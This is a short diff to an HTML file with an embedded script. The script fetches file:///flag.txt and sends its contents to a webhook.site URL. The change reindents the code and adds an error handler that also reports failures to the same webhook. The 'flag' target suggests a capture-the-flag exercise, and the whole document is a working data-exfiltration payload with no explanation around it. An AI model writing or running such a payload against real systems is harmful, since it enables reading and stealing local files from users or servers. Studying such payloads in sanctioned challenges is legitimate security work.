@@ -3,10 +3,14 @@
 <script>
 // Try to read local files or make requests
 fetch('file:///flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    // Exfiltrate the flag somehow - maybe to your server
-    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?flag=' + encodeURIComponent(data));
-  });
+    .then(response => response.text())
+    .then(data => {
+        // Exfiltrate the flag somehow - maybe to your server
+        fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?flag=' + encodeURIComponent(data));
+    })
+    .catch(error => {
+        // Call webhook with error information if fetch fails
+        fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?error=' + encodeURIComponent(error.message));
+    });
 </script>
 </html>
